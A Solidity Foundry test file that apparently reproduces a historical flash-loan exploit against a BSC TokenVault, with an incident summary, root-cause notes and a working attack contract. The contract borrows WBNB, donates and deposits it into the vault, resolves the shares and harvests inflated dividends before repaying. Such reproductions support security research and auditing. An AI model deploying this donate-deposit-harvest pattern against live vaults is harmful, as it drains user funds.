// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3,226.51 USD
// Attacker : 0xc49f2938327aa2cdc3f2f89ed17b54b3671f05de
// Attack Contract : 0x96cfc7fd01fcf3a3b6ee4891b4d2b7e0a951ad70
// Vulnerable Contract : 0x5b68efe78d9951a8c347a5dc807998c40934cd14
// Attack Tx : https://bscscan.com/tx/0x3de562f2fdaeb379ccbe8d244a56189db2a0f91410cd0f464274e51e4518e555
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5b68efe78d9951a8c347a5dc807998c40934cd14#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1325
// Related BUSD incident : https://bscscan.com/tx/0x00e5c8e39eece020ad21d965402d2f9248f0a6ab62030830b12f9823c2b6d763
//
// Attack summary: the attacker deployed initcode that borrowed WBNB from the Pancake WBNB/USDT pair,
// donated WBNB into the TokenVault drip pool, deposited WBNB into the vault, resolved the fresh shares,
// harvested the resulting WBNB dividends, repaid the flash swap, and kept the remaining WBNB.
// Root cause: TokenVault adds freshly deposited shares before allocating deposit fees and also lets a
// same-transaction holder resolve then harvest against existing drip/fee accounting. A temporary WBNB
// position can therefore receive more WBNB from the vault than the donated/deposited principal.

address constant ATTACKER = address(uint160(0x00c49f2938327aa2cdc3f2f89ed17b54b3671f05de));
address constant HISTORICAL_ATTACK_CONTRACT = address(uint160(0x0096cfc7fd01fcf3a3b6ee4891b4d2b7e0a951ad70));
address constant HISTORICAL_CALLBACK_HELPER = address(uint160(0x007136b28089342f84c87d0f12d17e424f691375f1));
address constant WBNB_USDT_PAIR = address(uint160(0x0016b9a82891338f9ba80e2d6970fdda79d1eb0dae));
address constant TOKEN_VAULT = address(uint160(0x005b68efe78d9951a8c347a5dc807998c40934cd14));
address constant OG_TOKEN = address(uint160(0x000935072f012190354ef41a66078250f1cf2846dd));
address constant WBNB_TOKEN = address(uint160(0x00bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c));
address constant USDT_TOKEN = address(uint160(0x0055d398326f99059ff775485246999027b3197955));

uint256 constant FLASH_WBNB_AMOUNT = 4 ether;
uint256 constant DONATE_AMOUNT = 2 ether;
uint256 constant DEPOSIT_AMOUNT = 1_114_100_000_000_000_000;
uint256 constant HISTORICAL_SHARE_BALANCE = 1_002_690_000_000_000_000;
uint256 constant HARVESTED_WBNB = 8_108_136_659_505_117_400;
uint256 constant FLASH_WBNB_REPAY = 4_010_400_000_000_000_000;
uint256 constant HISTORICAL_PROFIT = 4_983_636_659_505_117_400;

interface IPancakePair1325 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IPancakeCallee1325 {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface ITokenVault1325 {
    function donate(
        uint256 amount
    ) external returns (uint256);
    function depositTo(address user, uint256 amount) external returns (uint256);
    function myTokens() external view returns (uint256);
    function resolve(
        uint256 amount
    ) external;
    function harvest() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("bsc", 51_783_614);
        vm.roll(51_783_615);
        vm.warp(1_750_419_729);

        fundingToken = WBNB_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HISTORICAL_CALLBACK_HELPER, "Historical callback helper");
        vm.label(WBNB_USDT_PAIR, "WBNB/USDT Pancake pair");
        vm.label(TOKEN_VAULT, "TokenVault");
        vm.label(OG_TOKEN, "OGToken");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog {
        assertEq(IPancakePair1325(WBNB_USDT_PAIR).token0(), USDT_TOKEN);
        assertEq(IPancakePair1325(WBNB_USDT_PAIR).token1(), WBNB_TOKEN);

        uint256 pairWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(WBNB_USDT_PAIR);
        uint256 attackerWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(ATTACKER);

        TokenVaultAttack attack = new TokenVaultAttack(ATTACKER);
        attack.execute();

        uint256 attackerProfit = IERC20(WBNB_TOKEN).balanceOf(ATTACKER) - attackerWbnbBefore;
        assertEq(attackerProfit, HISTORICAL_PROFIT);
        assertEq(IERC20(WBNB_TOKEN).balanceOf(WBNB_USDT_PAIR), pairWbnbBefore + FLASH_WBNB_REPAY - FLASH_WBNB_AMOUNT);
    }
}

contract TokenVaultAttack is IPancakeCallee1325 {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    function execute() external {
        IPancakePair1325(WBNB_USDT_PAIR).swap(0, FLASH_WBNB_AMOUNT, address(this), abi.encode(uint256(1)));
        IERC20(WBNB_TOKEN).transfer(profitReceiver, IERC20(WBNB_TOKEN).balanceOf(address(this)));
    }

    function pancakeCall(address, uint256 amount0, uint256 amount1, bytes calldata) external override {
        require(msg.sender == WBNB_USDT_PAIR, "unexpected pair");
        require(amount0 == 0 && amount1 == FLASH_WBNB_AMOUNT, "unexpected flash amount");

        IERC20(WBNB_TOKEN).approve(TOKEN_VAULT, FLASH_WBNB_AMOUNT);

        ITokenVault1325(TOKEN_VAULT).donate(DONATE_AMOUNT);
        ITokenVault1325(TOKEN_VAULT).depositTo(address(this), DEPOSIT_AMOUNT);

        uint256 shareBalance = ITokenVault1325(TOKEN_VAULT).myTokens();
        require(shareBalance == HISTORICAL_SHARE_BALANCE, "unexpected shares");

        ITokenVault1325(TOKEN_VAULT).resolve(shareBalance);

        uint256 beforeHarvest = IERC20(WBNB_TOKEN).balanceOf(address(this));
        ITokenVault1325(TOKEN_VAULT).harvest();
        require(IERC20(WBNB_TOKEN).balanceOf(address(this)) - beforeHarvest == HARVESTED_WBNB, "unexpected harvest");

        IERC20(WBNB_TOKEN).transfer(WBNB_USDT_PAIR, FLASH_WBNB_REPAY);
    }
}
